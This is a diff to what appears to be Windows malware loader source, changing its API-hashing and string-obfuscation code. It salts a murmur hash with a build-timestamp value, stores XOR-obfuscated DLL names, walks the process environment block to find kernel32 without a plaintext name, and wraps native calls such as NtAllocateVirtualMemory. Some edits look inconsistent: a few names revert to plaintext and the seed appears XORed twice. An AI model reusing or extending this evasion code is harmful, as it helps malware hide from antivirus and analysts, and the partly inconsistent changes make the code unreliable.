@@ -1,12 +1,16 @@
 #include <Windows.h>
 #include <TlHelp32.h>
 #include <wininet.h>
+#include<iostream>
 
 #include "undoc.h"
 #include "sysutil.h"
 
 #pragma once
 
+static unsigned long	z = (unsigned int)__TIMESTAMP__;
+
+#define KISS  z
 
 //
 //-----------------------------------------------------------------------------------------
@@ -16,7 +20,7 @@ DWORD murmur_hash(LPCSTR key, UINT length, DWORD seed)
 	// 'm' and 'r' are mixing constants generated offline.
 	// They're not really 'magic', they just happen to work well.
 
-	const unsigned int m = 0x5bd1e995;
+	const unsigned int m = 0x5bd1e995 ^ KISS;
 	const int r = 24;
 
 	// Initialize the hash to a 'random' value
@@ -31,11 +35,11 @@ DWORD murmur_hash(LPCSTR key, UINT length, DWORD seed)
 	{
 		unsigned int k = *(unsigned int *)data;
 
-		k *= m;
+		k *= m ^ KISS;
 		k ^= k >> r;
-		k *= m;
+		k *= m ^ KISS;
 
-		h *= m;
+		h *= m ^ KISS;
 		h ^= k;
 
 		data += 4;
@@ -49,14 +53,14 @@ DWORD murmur_hash(LPCSTR key, UINT length, DWORD seed)
 	case 3: h ^= data[2] << 16;
 	case 2: h ^= data[1] << 8;
 	case 1: h ^= data[0];
-		h *= m;
+		h *= m ^ KISS;
 	};
 
 	// Do a few final mixes of the hash to ensure the last few
 	// bytes are well-incorporated.
 
 	h ^= h >> 13;
-	h *= m;
+	h *= m ^ KISS;
 	h ^= h >> 15;
 
 	return h;
@@ -92,15 +96,7 @@ BOOL compareA(LPCSTR string1, LPCSTR string2, UINT max_length)
 
 //-----------------------------------------------------------------------------------------
 
-static unsigned long	z = 3624360 * (unsigned int)__TIMESTAMP__, w = 5212886 * (unsigned int)__TIMESTAMP__, \
-jsr = 1234567 * (unsigned int)__TIMESTAMP__, jcong = 3801161 * (unsigned int)__TIMESTAMP__;
-
-#define KISS  z
-
-
-//-----------------------------------------------------------------------------------------
-
-#define API_HASHING_SEED		0x8f31accd		//Hashing seed used by murmur hash in api.c
+#define API_HASHING_SEED		0x8f31accd ^ KISS		//Hashing seed used by murmur hash in api.c
 
 // Config & api
 #define HASHING_SEED			API_HASHING_SEED
@@ -118,13 +114,13 @@ jsr = 1234567 * (unsigned int)__TIMESTAMP__, jcong = 3801161 * (unsigned int)__T
 unsigned char kernel32[] = "\x23\x23\x0c\x48\x4a\x57\x53\x4a\x51\x10\x17\x13\x49\x51\x51";	// "kernel32.dll"	deobfuscate(kernel32)
 unsigned char shell32[] = "\x23\x23\x0b\x50\x4d\x4a\x51\x51\x10\x17\x13\x49\x51\x51";		// "shell32.dll"	deobfuscate(shell32)
 unsigned char shlwapi[] = "\x23\x23\x0b\xb0\x4d\x51\x54\x46\x55\x4e\x13\x49\x51\x51";		// "Shlwapi.dll"	deobfuscate(shlwapi)
-unsigned char ntdll[] = "\x23\x23\x09\x53\x59\x49\x51\x51\x13\x49\x51\x51";				// "ntdll.dll"		deobfuscate(ntdll)
+unsigned char ntdll[] = "\x23\x23\x09\x53\x59\x49\x51\x51\x13\x49\x51\x51";					// "ntdll.dll"		deobfuscate(ntdll)
 unsigned char advapi32[] = "\x23\x23\x0c\xa6\x49\x5b\x46\x55\x4e\x10\x17\x13\x51\x4e\x47";	// "Advapi32.lib"	deobfuscate(advapi32)
 unsigned char user32[] = "\x23\x23\x0a\x5a\x50\x4a\x57\x10\x17\x13\x49\x51\x51";			// "user32.dll"		deobfuscate(user32)
 unsigned char wininet[] = "\x23\x23\x0b\x54\x4e\x53\x4e\x53\x4a\x59\x13\x49\x51\x51";		// "wininet.dll"	deobfuscate(wininet)
 unsigned char msvcrt[] = "\x23\x23\x0a\x52\x50\x5b\x40\x57\x59\x13\x49\x51\x51";			// "msvcrt.dll"		deobfuscate(msvcrt)
-unsigned char heapalloc[] = "\x23\x23\x09\xad\x4a\x46\x55\xa6\x51\x51\x4c\x40";				// "HeapAlloc"		deobfuscate(heapalloc)
-unsigned char heaprealloc[] = "\x23\x23\x0b\xad\x4a\x46\x55\xb7\x4a\xa6\x51\x51\x4c\x40";		// "HeapReAlloc"	deobfuscate(heaprealloc)
+unsigned char heapalloc[] = "\x08\x21\x20\x40\xaf\xab\xb8\x4b\xa4\xa4\xa9\xad";				// "HeapAlloc"		deobfuscate(heapalloc)
+unsigned char heaprealloc[] = "\x08\x21\x22\x40\xaf\xab\xb8\x5a\xaf\x4b\xa4\xa4\xa9\xad";	// "HeapReAlloc"	deobfuscate(heaprealloc)
 
 
 
@@ -271,10 +267,6 @@ static DWORD function_hash_chain[] = {
 
 };
 
-//-----------------------------------------------------------------------------------------
-//
-//									Определения функций
-//
 //-----------------------------------------------------------------------------------------
 
 /*
@@ -2313,9 +2305,9 @@ NTSTATUS cRtlCreateProcessParametersEx(
 
 
 }
-
-NTSTATUS(WINAPI *my_f_RtlCreateProcessParametersEx)(
-	_Out_	 my_PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
+/*
+NTSTATUS(WINAPI *f_RtlCreateProcessParametersEx)(
+	_Out_	 PRTL_USER_PROCESS_PARAMETERS32 *pProcessParameters,
 	_In_	 PUNICODE_STRING ImagePathName,
 	_In_opt_ PUNICODE_STRING DllPath,
 	_In_opt_ PUNICODE_STRING CurrentDirectory,
@@ -2327,8 +2319,10 @@ NTSTATUS(WINAPI *my_f_RtlCreateProcessParametersEx)(
 	_In_opt_ PUNICODE_STRING RuntimeData,
 	_In_	 ULONG Flags) = NULL;
 
-NTSTATUS my_cRtlCreateProcessParametersEx(
-	_Out_	 my_PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
+
+
+NTSTATUS cRtlCreateProcessParametersEx(
+	_Out_	 PRTL_USER_PROCESS_PARAMETERS32 *pProcessParameters,
 	_In_	 PUNICODE_STRING ImagePathName,
 	_In_opt_ PUNICODE_STRING DllPath,
 	_In_opt_ PUNICODE_STRING CurrentDirectory,
@@ -2340,8 +2334,8 @@ NTSTATUS my_cRtlCreateProcessParametersEx(
 	_In_opt_ PUNICODE_STRING RuntimeData,
 	_In_	 ULONG Flags)
 {
-	if (my_f_RtlCreateProcessParametersEx == NULL) {
-		my_f_RtlCreateProcessParametersEx = (NTSTATUS(WINAPI *)(my_PRTL_USER_PROCESS_PARAMETERS*,
+	if (f_RtlCreateProcessParametersEx == NULL) {
+		f_RtlCreateProcessParametersEx = (NTSTATUS(WINAPI *)(PRTL_USER_PROCESS_PARAMETERS32*,
 			PUNICODE_STRING,
 			PUNICODE_STRING,
 			PUNICODE_STRING,
@@ -2353,10 +2347,10 @@ NTSTATUS my_cRtlCreateProcessParametersEx(
 			PUNICODE_STRING,
 			ULONG))
 			resolve_function(function_hash_chain[94], deobfuscate(ntdll));
-		CHECK_VALID(my_f_RtlCreateProcessParametersEx);
+		CHECK_VALID(f_RtlCreateProcessParametersEx);
 	}
 
-	return my_f_RtlCreateProcessParametersEx(pProcessParameters,
+	return f_RtlCreateProcessParametersEx(pProcessParameters,
 		ImagePathName,
 		DllPath,
 		CurrentDirectory,
@@ -2370,7 +2364,7 @@ NTSTATUS my_cRtlCreateProcessParametersEx(
 
 
 }
-
+*/
 
 NTSTATUS(WINAPI *f_NtAllocateVirtualMemory)(
 	_In_        HANDLE ProcessHandle,
@@ -2897,13 +2891,23 @@ static HMODULE get_kernel32_base(VOID)
 	INT_PTR krnbase = *(INT_PTR*)(mlink + KernelBaseAddr);
 
 	LDR_MODULE *mdl = (LDR_MODULE*)mlink;
+
+	//------------
+	const char *krnl = deobfuscate(kernel32);
+	size_t size = strlen(krnl) + 1;
+	wchar_t* krnl_name = new wchar_t[size];
+
+	size_t outSize;
+	mbstowcs_s(&outSize, krnl_name, size, krnl, size - 1);
+	//-------------
+
 	do
 	{
 		mdl = (LDR_MODULE*)mdl->e[0].Flink;
 
 		if (mdl->base != NULL)
 		{
-			if (!lstrcmpiW(mdl->dllname.Buffer, L"kernel32.dll")) // fix: hide text
+			if (!lstrcmpiW(mdl->dllname.Buffer, krnl_name))
 			{
 				break;
 			}
@@ -2936,31 +2940,33 @@ static LPVOID resolve_export(HMODULE module, DWORD function_hash)
 	ordinal_ptr = (PWORD)((DWORD_PTR)dos_header + eat->AddressOfNameOrdinals);
 
 	ordinal = -1;
+
 	for (i = 0; i < eat->NumberOfNames; i++) {
 
 		name_string = (PCHAR)((DWORD_PTR)dos_header + name_ptr[i]);
 
-		name_hash = MURMUR_HASH(name_string, API_STRLEN(name_string), HASHING_SEED);
-
-		if ((!API_STRCMP(name_string, deobfuscate(heapalloc), API_STRLEN(deobfuscate(heapalloc)))) && ((name_hash ^ KISS) == function_hash)) {
+		name_hash = MURMUR_HASH(name_string, API_STRLEN(name_string), HASHING_SEED ^ KISS);
+		
+		if ((!API_STRCMP(name_string, "HeapAlloc", API_STRLEN("HeapAlloc"))) && ((name_hash ^ KISS) == function_hash)) {
 			// Add in an exception for this one
 			if (f_GetProcAddress != NULL) {
-				return f_GetProcAddress(module, deobfuscate(heapalloc));
+				return f_GetProcAddress(module, "HeapAlloc");
 			}
 			else {
 				return NULL;
 			}
 		}
-
-		if ((!API_STRCMP(name_string, deobfuscate(heaprealloc), API_STRLEN(deobfuscate(heaprealloc)))) && ((name_hash ^ KISS) == function_hash)) {
+		
+		if ((!API_STRCMP(name_string, "HeapReAlloc", API_STRLEN("HeapReAlloc"))) && ((name_hash ^ KISS) == function_hash)) {
 			// Add in an exception for this one
 			if (f_GetProcAddress != NULL) {
-				return f_GetProcAddress(module, deobfuscate(heaprealloc));
+				return f_GetProcAddress(module, "HeapReAlloc");
 			}
 			else {
 				return NULL;
 			}
 		}
+		
 
 		if (function_hash == (name_hash ^ KISS)) {
 			ordinal = (UINT)ordinal_ptr[i];
